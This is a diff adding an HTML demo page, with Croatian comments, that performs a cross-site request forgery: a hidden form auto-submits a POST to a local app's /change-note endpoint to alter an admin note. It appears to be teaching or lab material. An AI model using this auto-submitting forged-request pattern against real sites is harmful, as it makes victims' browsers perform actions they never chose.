@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Attacker page (CSRF)</title></head>
+<body>
+  <h1>Attacker demo: CSRF form</h1>
+  <p>Ova stranica automatski šalje POST na /change-note aplikacije (ako je dostupna), mijenjajući admin note.</p>
+
+  <form id="csrfForm" method="POST" action="http://localhost:3000/change-note">
+    <input type="hidden" name="note" value="CSRF napad">
+  </form>
+
+  <script>
+    // automatski submit (simulira žrtvin browser koji posjećuje attacker stranicu)
+    setTimeout(() => { document.getElementById('csrfForm').submit(); }, 1000);
+  </script>
+</body></html>
